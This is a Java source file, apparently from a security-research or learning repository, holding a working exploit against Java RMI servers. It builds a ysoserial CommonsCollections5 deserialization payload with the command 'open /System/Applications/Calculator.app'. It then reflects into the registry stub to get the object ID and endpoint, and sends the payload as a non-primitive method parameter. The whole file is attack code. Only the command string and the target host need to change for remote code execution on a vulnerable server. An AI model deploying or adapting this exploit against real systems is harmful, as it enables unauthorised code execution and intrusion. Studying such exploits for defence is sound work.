package com.wu.attackRmi.Exploit;

import com.wu.attackRmi.utils.ComputeMethodHash;
import com.wu.attackRmi.utils.Stub;
import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;
import ysoserial.payloads.CommonsCollections5;

import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.ObjID;
import java.rmi.server.RemoteObject;

public class AttackServerByNonPrimitiveParameter {
    public static void main(String[] args) throws Exception{
        String registryHost  = "127.0.0.1";
        int registryPort = 1099;
        String name = "hello";
        String methodSignature = "sayHello(Ljava/lang/String;)Ljava/lang/String;";
        String cmd = "open /System/Applications/Calculator.app";
        Object payloadObject = new CommonsCollections5().getObject(cmd);

        attack(registryHost, registryPort, name, methodSignature, payloadObject);
    }

    public static void attack(String registryHost, int registryPort, String lookupName, String methodSignature, Object payloadObject) throws Exception{
        // get the objid and tcpendpoint by lookup
        Registry registry = LocateRegistry.getRegistry(registryHost, registryPort);
        Proxy hello =  (Proxy) registry.lookup( lookupName);
        Field h = Proxy.class.getDeclaredField("h");
        h.setAccessible(true);
        InvocationHandler invocationHandler =  (InvocationHandler) h.get(hello);
        Field unicastref = RemoteObject.class.getDeclaredField("ref");
        unicastref.setAccessible(true);
        UnicastRef ref = (UnicastRef)unicastref.get(invocationHandler);
        Field liveref_filed = UnicastRef.class.getDeclaredField("ref");
        liveref_filed.setAccessible(true);
        LiveRef liveref = (LiveRef) liveref_filed.get(ref);
        Field objid_field = LiveRef.class.getDeclaredField("id");
        objid_field.setAccessible(true);
        ObjID id = (ObjID) objid_field.get(liveref);
        Field ep_field = LiveRef.class.getDeclaredField("ep");
        ep_field.setAccessible(true);
        TCPEndpoint tp = (TCPEndpoint) ep_field.get(liveref);
        Field host_field = TCPEndpoint.class.getDeclaredField("host");
        host_field.setAccessible(true);
        String tcp_host = (String) host_field.get(tp);
        Field port_filed = TCPEndpoint.class.getDeclaredField("port");
        port_filed.setAccessible(true);
        int tcp_port = (int) port_filed.get(tp);

        long hash = ComputeMethodHash.computeMethodHash(methodSignature);

        Stub.exploit(tcp_host, tcp_port, payloadObject, id,-1, hash);
    }
}
